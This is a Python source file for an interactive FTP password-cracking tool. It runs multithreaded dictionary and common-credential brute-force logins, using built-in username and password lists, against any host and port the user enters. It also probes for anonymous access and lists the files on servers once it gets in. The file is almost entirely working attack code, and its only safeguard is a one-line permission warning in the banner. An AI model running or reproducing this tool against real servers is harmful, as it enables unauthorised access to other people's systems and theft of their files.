#!/usr/bin/env python3
"""
FTP Cracker Tool
Attempt to crack FTP credentials and explore FTP servers
"""

import os
import socket
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from tqdm import tqdm
import ftplib

class FTPCracker:
    def __init__(self):
        self.common_usernames = [
            'anonymous', 'ftp', 'admin', 'administrator', 'user', 'guest',
            'test', 'root', 'operator', 'upload', 'download', 'www',
            'www-data', 'apache', 'nginx', 'mysql', 'postgres', 'oracle',
            'backup', 'demo', 'trial', 'temp', 'public', 'private',
            'client', 'customer', 'support', 'help', 'service', 'data'
        ]
        
        self.common_passwords = [
            'anonymous', 'ftp', 'password', '123456', '123456789', 'qwerty',
            'abc123', 'password123', 'admin', 'letmein', 'welcome', 'monkey',
            'guest', 'test', 'user', 'login', 'default', 'changeme',
            'secret', 'master', 'pass', 'root', 'toor', 'server',
            'client', 'customer', 'support', 'help', 'service',
            'email', 'password1', '123123', 'qwerty123', 'password!',
            'admin123', 'ftp123', 'anonymous@', 'guest@', 'test@'
        ]
        
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_attack = False
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def display_banner(self):
        """Display tool banner"""
        print(Fore.CYAN + "=" * 60)
        print(Fore.YELLOW + "           📁 FTP CRACKER TOOL")
        print(Fore.CYAN + "=" * 60)
        print(Fore.GREEN + "Attempt to crack FTP credentials and explore servers")
        print(Fore.RED + "⚠️  Use only on FTP servers you own or have permission to test!")
        print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
        print()
    
    def validate_target(self, target):
        """Validate IP address or hostname"""
        try:
            # Try to parse as IP address
            socket.inet_aton(target)
            return True, "Valid IP address"
        except socket.error:
            # Try to resolve as hostname
            try:
                socket.gethostbyname(target)
                return True, "Valid hostname"
            except socket.gaierror:
                return False, "Invalid hostname or IP address"
    
    def test_ftp_connection(self, target, port, username, password, timeout=5):
        """Test FTP credentials"""
        if self.stop_attack:
            return None
        
        try:
            # Create FTP connection
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=timeout)
            
            # Attempt login
            response = ftp.login(username, password)
            ftp.quit()
            
            # Check if login was successful
            if "230" in response or "331" in response:
                return {
                    'target': target,
                    'port': port,
                    'username': username,
                    'password': password,
                    'response': response
                }
            else:
                return None
                
        except ftplib.error_perm as e:
            # Permission denied - wrong credentials
            if "530" in str(e):
                return None
            else:
                return None
        except ftplib.error_temp:
            # Temporary error
            return None
        except socket.timeout:
            # Connection timeout
            return None
        except socket.error:
            # Network error
            return None
        except Exception:
            # Other errors
            return None
    
    def check_ftp_service(self, target, port=21, timeout=5):
        """Check if FTP service is running"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                # Try to get FTP banner
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=timeout)
                    welcome = ftp.getwelcome()
                    ftp.quit()
                    return True, welcome.strip()
                except:
                    return True, "FTP service detected"
            else:
                return False, "Connection refused"
                
        except Exception:
            return False, "Error checking service"
    
    def get_ftp_info(self, target, port=21):
        """Get FTP server information"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=5)
            welcome = ftp.getwelcome()
            ftp.quit()
            
            info = {
                'banner': welcome.strip(),
                'server': 'Unknown'
            }
            
            # Extract server info from banner
            if "ProFTPD" in welcome:
                info['server'] = 'ProFTPD'
            elif "vsftpd" in welcome:
                info['server'] = 'vsftpd'
            elif "FileZilla" in welcome:
                info['server'] = 'FileZilla'
            elif "Microsoft FTP Service" in welcome:
                info['server'] = 'Microsoft FTP'
            elif "Pure-FTPd" in welcome:
                info['server'] = 'Pure-FTPd'
            
            return info
            
        except Exception:
            return {'banner': 'Unknown', 'server': 'Unknown'}
    
    def test_anonymous_access(self, target, port=21):
        """Test if anonymous FTP access is available"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=5)
            
            # Try anonymous login with different password options
            anonymous_passwords = ['anonymous@', 'anonymous', 'guest@', 'guest', '', 'user@', 'user']
            
            for password in anonymous_passwords:
                try:
                    response = ftp.login('anonymous', password)
                    ftp.quit()
                    return True, password, response
                except:
                    continue
            
            return False, None, None
            
        except Exception:
            return False, None, None
    
    def explore_ftp_server(self, target, port, username, password):
        """Explore FTP server after successful login"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=10)
            ftp.login(username, password)
            
            exploration = {
                'current_directory': ftp.pwd(),
                'files': [],
                'directories': [],
                'total_size': 0,
                'file_count': 0,
                'dir_count': 0
            }
            
            # Get directory listing
            try:
                files = []
                ftp.dir(files.append)
                
                for file_info in files:
                    parts = file_info.split()
                    if len(parts) >= 9:
                        name = ' '.join(parts[8:])
                        permissions = parts[0]
                        size = parts[4] if parts[4].isdigit() else '0'
                        
                        if permissions.startswith('d'):
                            exploration['directories'].append({
                                'name': name,
                                'permissions': permissions
                            })
                            exploration['dir_count'] += 1
                        else:
                            exploration['files'].append({
                                'name': name,
                                'size': int(size),
                                'permissions': permissions
                            })
                            exploration['file_count'] += 1
                            exploration['total_size'] += int(size)
                
            except Exception as e:
                exploration['error'] = str(e)
            
            # Try to get system info
            try:
                exploration['system'] = ftp.sendcmd('SYST')
            except:
                exploration['system'] = 'Unknown'
            
            ftp.quit()
            return exploration
            
        except Exception as e:
            return {'error': str(e)}
    
    def generate_combinations(self, usernames, passwords):
        """Generate username/password combinations"""
        combinations = []
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
        return combinations
    
    def dictionary_attack(self, target, port, usernames, passwords, max_threads=10):
        """Perform dictionary attack"""
        combinations = self.generate_combinations(usernames, passwords)
        print(Fore.CYAN + f"[*] Starting dictionary attack with {len(combinations)} combinations...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_ftp_connection, target, port, username, password): (username, password) 
                      for username, password in combinations}
            
            with tqdm(total=len(futures), desc="Testing credentials", 
                     bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
                
                for future in as_completed(futures):
                    if self.stop_attack:
                        break
                    
                    try:
                        result = future.result()
                        if result:
                            with self.lock:
                                self.found_credentials.append(result)
                            print(Fore.GREEN + f"\n[+] VALID CREDENTIALS FOUND: {result['username']}:{result['password']}" + Style.RESET_ALL)
                    except Exception:
                        pass
                    
                    pbar.update(1)
        
        return self.found_credentials
    
    def load_wordlist(self, filepath):
        """Load usernames or passwords from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                items = [line.strip() for line in f if line.strip()]
            return items
        except Exception as e:
            print(Fore.RED + f"[-] Error loading wordlist: {e}")
            return None
    
    def save_results(self, results, attack_type, duration):
        """Save cracking results to file"""
        try:
            filename = f"ftp_crack_results_{int(time.time())}.txt"
            
            with open(filename, 'w') as f:
                f.write(f"FTP Cracking Results\n")
                f.write(f"====================\n\n")
                f.write(f"Attack Type: {attack_type}\n")
                f.write(f"Duration: {duration:.2f} seconds\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Valid Credentials Found: {len(results)}\n\n")
                
                if results:
                    f.write("Target\tPort\tUsername\tPassword\tResponse\n")
                    f.write("-" * 70 + "\n")
                    
                    for cred in results:
                        f.write(f"{cred['target']}\t{cred['port']}\t{cred['username']}\t{cred['password']}\t{cred['response']}\n")
                else:
                    f.write("No valid credentials found.\n")
            
            print(Fore.GREEN + f"[+] Results saved to: {filename}")
        except Exception as e:
            print(Fore.RED + f"[-] Error saving results: {e}")
    
    def display_results(self, results):
        """Display found credentials"""
        if not results:
            print(Fore.YELLOW + "[*] No valid credentials found")
            return
        
        print(Fore.GREEN + f"\n[+] Found {len(results)} valid credential(s):")
        print()
        
        # Table header
        print(f"{'Target':<15} {'Port':<6} {'Username':<15} {'Password'}")
        print("-" * 60)
        
        for cred in results:
            print(f"{cred['target']:<15} {cred['port']:<6} {cred['username']:<15} {cred['password']}")
    
    def display_exploration_results(self, exploration, target):
        """Display FTP exploration results"""
        print(Fore.GREEN + f"\n[+] FTP Server Exploration Results for {target}:")
        print()
        
        if 'error' in exploration:
            print(Fore.RED + f"[-] Exploration error: {exploration['error']}")
            return
        
        print(f"Current Directory: {exploration['current_directory']}")
        print(f"System: {exploration.get('system', 'Unknown')}")
        print(f"Total Files: {exploration['file_count']}")
        print(f"Total Directories: {exploration['dir_count']}")
        print(f"Total Size: {exploration['total_size']:,} bytes")
        
        if exploration['files']:
            print(Fore.CYAN + f"\n[*] Files:")
            for file_info in exploration['files'][:20]:  # Show first 20 files
                print(f"  {file_info['name']} ({file_info['size']} bytes) - {file_info['permissions']}")
            
            if len(exploration['files']) > 20:
                print(f"  ... and {len(exploration['files']) - 20} more files")
        
        if exploration['directories']:
            print(Fore.CYAN + f"\n[*] Directories:")
            for dir_info in exploration['directories'][:20]:  # Show first 20 directories
                print(f"  {dir_info['name']}/ - {dir_info['permissions']}")
            
            if len(exploration['directories']) > 20:
                print(f"  ... and {len(exploration['directories']) - 20} more directories")
    
    def run(self):
        """Main tool execution"""
        self.clear_screen()
        self.display_banner()
        
        while True:
            try:
                print(Fore.CYAN + "\n[*] FTP Cracker Menu:")
                print("1. Dictionary Attack")
                print("2. Test Anonymous Access")
                print("3. Common Credentials Attack")
                print("4. Explore FTP Server (with credentials)")
                print("5. Back to main menu")
                
                choice = input(Fore.YELLOW + "\nSelect option (1-5): " + Style.RESET_ALL).strip()
                
                if choice == '5':
                    return
                
                # Get target
                target = input(Fore.YELLOW + "\nEnter target IP or hostname: " + Style.RESET_ALL).strip()
                
                if not target:
                    print(Fore.RED + "[-] Please enter a target!")
                    continue
                
                is_valid, message = self.validate_target(target)
                if not is_valid:
                    print(Fore.RED + f"[-] {message}")
                    continue
                
                # Get port
                port_input = input(Fore.YELLOW + "Enter FTP port (default=21): " + Style.RESET_ALL).strip()
                try:
                    port = int(port_input) if port_input else 21
                    if port < 1 or port > 65535:
                        print(Fore.RED + "[-] Invalid port number!")
                        continue
                except ValueError:
                    print(Fore.RED + "[-] Invalid port number!")
                    continue
                
                # Check FTP service
                print(Fore.CYAN + f"\n[*] Checking FTP service on {target}:{port}...")
                service_running, service_info = self.check_ftp_service(target, port)
                
                if not service_running:
                    print(Fore.RED + f"[-] FTP service not available: {service_info}")
                    continue
                
                print(Fore.GREEN + f"[+] FTP service detected")
                print(Fore.GREEN + f"[+] Banner: {service_info}")
                
                # Get FTP server info
                ftp_info = self.get_ftp_info(target, port)
                print(Fore.GREEN + f"[+] Server Type: {ftp_info['server']}")
                
                if choice == '2':
                    # Test anonymous access
                    print(Fore.CYAN + "\n[*] Testing anonymous FTP access...")
                    anonymous_available, password, response = self.test_anonymous_access(target, port)
                    
                    if anonymous_available:
                        print(Fore.GREEN + f"[+] Anonymous access available!")
                        print(Fore.GREEN + f"[+] Password used: '{password}'")
                        print(Fore.GREEN + f"[+] Response: {response.strip()}")
                        
                        # Explore anonymous FTP
                        explore = input(Fore.YELLOW + "\nExplore anonymous FTP? (y/n): " + Style.RESET_ALL).strip().lower()
                        if explore == 'y':
                            exploration = self.explore_ftp_server(target, port, 'anonymous', password)
                            self.display_exploration_results(exploration, target)
                    else:
                        print(Fore.YELLOW + "[*] Anonymous access not available")
                
                elif choice == '4':
                    # Explore FTP server with provided credentials
                    username = input(Fore.YELLOW + "Enter username: " + Style.RESET_ALL).strip()
                    password = input(Fore.YELLOW + "Enter password: " + Style.RESET_ALL).strip()
                    
                    if not username or not password:
                        print(Fore.RED + "[-] Please provide both username and password!")
                        continue
                    
                    print(Fore.CYAN + f"\n[*] Exploring FTP server with {username}:{password}...")
                    exploration = self.explore_ftp_server(target, port, username, password)
                    self.display_exploration_results(exploration, target)
                
                else:
                    # Password cracking attacks
                    # Reset for new attack
                    self.found_credentials = []
                    self.stop_attack = False
                    
                    if choice == '1':
                        # Dictionary attack
                        print(Fore.CYAN + "\n[*] Dictionary Attack Configuration")
                        
                        # Get usernames
                        username_file = input(Fore.YELLOW + "Enter username wordlist file (press Enter for built-in): " + Style.RESET_ALL).strip()
                        if username_file and os.path.exists(username_file):
                            usernames = self.load_wordlist(username_file)
                            if usernames:
                                print(Fore.GREEN + f"[+] Loaded {len(usernames)} usernames")
                            else:
                                usernames = self.common_usernames
                        else:
                            usernames = self.common_usernames
                            print(Fore.YELLOW + "[*] Using built-in username list")
                        
                        # Get passwords
                        password_file = input(Fore.YELLOW + "Enter password wordlist file (press Enter for built-in): " + Style.RESET_ALL).strip()
                        if password_file and os.path.exists(password_file):
                            passwords = self.load_wordlist(password_file)
                            if passwords:
                                print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords")
                            else:
                                passwords = self.common_passwords
                        else:
                            passwords = self.common_passwords
                            print(Fore.YELLOW + "[*] Using built-in password list")
                        
                        # Warning for large combinations
                        total_combinations = len(usernames) * len(passwords)
                        if total_combinations > 10000:
                            print(Fore.YELLOW + f"[*] Warning: Testing {total_combinations:,} combinations may take a while!")
                            proceed = input(Fore.YELLOW + "Continue? (y/n): " + Style.RESET_ALL).strip().lower()
                            if proceed != 'y':
                                continue
                        
                        start_time = time.time()
                        results = self.dictionary_attack(target, port, usernames, passwords)
                        end_time = time.time()
                        attack_type = "Dictionary Attack"
                    
                    elif choice == '3':
                        # Common credentials attack
                        start_time = time.time()
                        results = self.dictionary_attack(target, port, 
                                                        self.common_usernames[:10], 
                                                        self.common_passwords[:10])
                        end_time = time.time()
                        attack_type = "Common Credentials Attack"
                    
                    else:
                        print(Fore.RED + "[-] Invalid choice!")
                        continue
                    
                    duration = end_time - start_time
                    
                    # Display results
                    print(Fore.CYAN + f"\n[*] Attack completed in {duration:.2f} seconds")
                    self.display_results(results)
                    
                    # Save results
                    if results:
                        self.save_results(results, attack_type, duration)
                        
                        # Ask if user wants to explore the server
                        if len(results) > 0:
                            explore = input(Fore.YELLOW + "\nExplore FTP server with found credentials? (y/n): " + Style.RESET_ALL).strip().lower()
                            if explore == 'y':
                                # Use first found credentials
                                cred = results[0]
                                exploration = self.explore_ftp_server(target, port, cred['username'], cred['password'])
                                self.display_exploration_results(exploration, target)
                
                print()
                another = input(Fore.YELLOW + "Attack another target? (y/n): " + Style.RESET_ALL).strip().lower()
                if another != 'y':
                    break
                    
            except KeyboardInterrupt:
                print(Fore.RED + "\n[*] Attack interrupted by user")
                self.stop_attack = True
                break
            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")
                continue